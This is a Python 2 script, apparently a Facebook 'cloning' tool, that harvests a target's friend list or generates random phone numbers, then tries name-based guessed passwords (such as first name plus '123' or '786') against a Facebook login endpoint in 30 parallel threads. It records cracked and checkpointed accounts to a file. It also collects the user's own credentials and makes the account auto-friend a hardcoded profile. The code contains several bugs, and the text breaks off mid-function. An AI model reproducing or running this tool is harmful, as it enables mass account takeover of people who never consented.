#coding=utf-8
########################################
# Yayan XD
# Cloning update 2020 
########################################
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(100000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Cloning.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Selamat Tinggal Asw '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:YAYAN XD
#### LOGO ####
logo = """
\033[1;91m  ▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
\033[1;91m  ▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
\033[1;91m  ▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
\033[1;91m  ▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒ \033[1;93mBEBEK TEAM V.01✔
\033[1;91m  ▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;91m  ▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  █████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  █████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m  ████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;94m╔══╗╔══╗─╔════╦═══╦═══╦═╗╔═╗
\033[1;92m║╔╗║║╔╗║─║╔╗╔╗║╔══╣╔═╗║║╚╝║║
\033[1;94m║╚╝╚╣╚╝╚╗╚╝║║╚╣╚══╣║─║║╔╗╔╗║
\033[1;92m║╔═╗║╔═╗║──║║─║╔══╣╚═╝║║║║║║
\033[1;94m║╚═╝║╚═╝║──║║─║╚══╣╔═╗║║║║║║
\033[1;92m╚═══╩═══╝──╚╝─╚═══╩╝─╚╩╝╚╝╚╝
\033[1;97m╔═══════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mAUTHOR \033[1;91m: \033[1;96mHILMAN GANZ XD_                   \033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mGITHUB \033[1;91m: \033[1;92mhttps://github.com/Yayan-XD \033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mFB     \033[1;91m: \033[1;92mHilman Maulana XD. \033[1;97m║
\033[1;97m╚═══════════════════════════════════════╝
\033[1;96m⊱══════════⊱═⊰BACOT BROTHERHOOD⊱══════════⊱═⊰
"""

CorrectUsername = "Hilman "
CorrectPassword = "Gans XD"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;94mUsername Tools \x1b[1;97m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;94mPassword Tools \x1b[1;97m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Salah Tolol!"
            os.system('xdg-open https://github.com/HILMAN-XD/BEBEK-BROTERHOOD')
    else:
        print "Salah Tolol!"
        os.system('xdg-open https://github.com/HILMAN-XD/BEBEK-BROTERHOOD')

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	jalan("\033[1;97m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	print "\033[1;91m>>>\033[1;91m[1]\033[1;92m Cloning Semua Negara \033[1;91m(\033[1;97mTanpa Fb login\033[1;91m) "
	time.sleep(0.05)
	print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login Pakai Facebook  "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[3]\033[1;92m Login Pakai Akses token "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Unduh Akses token"
	time.sleep(0.05)
	print "\033[1;91m>>>\033[1;91m[5]\033[1;92m Ikuti Fb Saya"
	time.sleep(0.05) 
	print "\033[1;91m>>>\033[1;91m[6]\033[1;94m Follow Ig Saya" 
	time.sleep(0.05)
	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Keluar        "
	jalan("\033[1;97m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;92mPilih Nomer═╬══►\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		menu()
	elif peak =="2":
		login1()
        elif peak =="3":
	        tokenz()
        elif peak =="4":
	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
	        login()
	elif peak =="5":
		os.system('xdg-open https://www.facebook.com/mdsanowarhossain.shan')
		login()
	elif peak =="6":
		os.system('xdg-open https://Instagram.com/hilman_2020')
		login()
	elif unikers =="0":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
		
	
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
		jalan('\033[1;96m[✾]\x1b[1;91mJANGAN GUNAKAN AKUN OLD UNTUK LOGIN\x1b[1;96m[✾]' )
		jalan('\033[1;96m[✾]\x1b[1;91mGUNAKAN AKUN BARU BUAT/LOGIN FIA TOKEN\x1b[1;96m[✾]' )
		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mSepertinya Akun Anda Terkena Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email Anda Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[+]\033[1;92mToken\033[1;91m :\033[1;95mMasukkan tautan token accees tanpa login Fb>> ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Salah"
		e = raw_input("\033[1;91m[?] \033[1;92mAnda Tau token? Kalo Tidak Tau Pm Saya!\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mSepertinya Akun Anda Terkena Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"  ) 
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
	print "\033[1;32;98m[1] \033[1;96m>> Mulai Cloning "																														
	print "\033[1;32;98m[0] \033[1;96m>> Keluar"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack Daftar Teman Publik") 
	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Keluar") 
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰═══════════════════════════════════════⊱⋕⊰\n" 
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Jangan Dulu Keluar Peler Lagi Proses... "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Mohon Tunggu ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ❈"
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Yayan-XD
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;58m]\x1b[1;58m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;58m]\x1b[1;58m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '123456'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['last_name'] + '12345'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mValid_OK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mInvalid_CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)	
																												   	
											
                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Telah Selesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Sudah Tersimpan \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def menu():
	os.system('clear')
	print logo
	print 42*"\033[1;91m="
	print '\033[1;94m[1]\033[1;92m  Bangladesh   \033[1;91m⇋  \033[1;94m[20]\033[1;93m  Albania'
	print '\033[1;94m[2]\033[1;92m  USA          \033[1;91m⇋  \033[1;94m[21]\033[1;93m  Algeria'
	print '\033[1;94m[3]\033[1;92m  UK           \033[1;91m⇋  \033[1;94m[22]\033[1;93m  Andorra'
	print '\033[1;94m[4] \033[1;92m India        \033[1;91m⇋  \033[1;94m[23]\033[1;93m  Armenia'
	print '\033[1;94m[5]\033[1;92m  Brazil       \033[1;91m⇋  \033[1;94m[24]\033[1;93m  Georgia'
	print '\033[1;94m[6]\033[1;92m  Japan        \033[1;91m⇋  \033[1;94m[25]\033[1;93m  Iceland'
	print '\033[1;94m[7]\033[1;92m  Korea        \033[1;91m⇋  \033[1;94m[26]\033[1;93m  China'
	print '\033[1;94m[8]\033[1;92m  Italy        \033[1;91m⇋  \033[1;94m[27]\033[1;93m  Bhutan'
	print '\033[1;94m[9]\033[1;92m  Spain        \033[1;91m⇋  \033[1;94m[28]\033[1;93m  Mongolia'
	print '\033[1;94m[10]\033[1;92m Poland       \033[1;91m⇋  \033[1;94m[29]\033[1;93m  New Zealand'
	print '\033[1;94m[11]\033[1;92m Pakistan     \033[1;91m⇋  \033[1;94m[30]\033[1;93m  Sudan'
	print '\033[1;94m[12]\033[1;92m Indonisia    \033[1;91m⇋  \033[1;94m[+]\033[1;93m Pak Nbr Fb Clone\033[1;94m[+] '
	print '\033[1;94m[13]\033[1;92m Iran         \033[1;91m⇋  \033[1;94m[A]\033[1;93m Telenor' 
	print '\033[1;94m[14]\033[1;92m Grecee       \033[1;91m⇋  \033[1;94m[B]\033[1;93m  Zong'
	print '\033[1;94m[15]\033[1;92m Afghanistan  \033[1;91m⇋  \033[1;94m[C]\033[1;93m  Jazz'
	print '\033[1;94m[16]\033[1;92m Syria        \033[1;91m⇋  \033[1;94m[+]\033[1;93m Bangal Nbr Fb Clone\033[1;94m[+] '
	print '\033[1;94m[17]\033[1;92m Turky        \033[1;91m⇋  \033[1;94m[D]\033[1;93m Airtel/Robi' 
	print '\033[1;94m[18]\033[1;92m Iraq         \033[1;91m⇋  \033[1;94m[E]\033[1;93m Grameenphone' 
	print '\033[1;94m[19]\033[1;92m France       \033[1;91m⇋  \033[1;94m[F]\033[1;93m Banglalink' 
	print '[0]\033[1;97m  Keluar            '
	print '>>\033[1;92m Selamat Datang Di Script \033[1;91m(\033[1;97mYayan-XD\033[1;91m) ' 
	print 42*"\033[1;91m="
	action()
	
	

def action():
	bch = raw_input('\n\033[1;91mPilih Nomer \033[1;93m>>>\033[1;95m  ')
	if bch =='':
		print '[!] Isi dengan benar'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;96m Masukan Kode  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":
		os.system("clear")
		print (logo)
		print("786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":
		os.system("clear")
		print (logo)
		print("737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="4":
		os.system("clear")
		print (logo)
		print("954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="5":
		os.system("clear")
		print (logo)
		print("127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+55"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
		os.system("clear")
		print (logo)
		print("11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="7":
		os.system("clear")
		print (logo)
		print("1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="8":
		os.system("clear")
		print (logo)
		print("388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+39"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="9":
		os.system("clear")
		print (logo)
		print("60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+34"
			idlist = ('.txt')
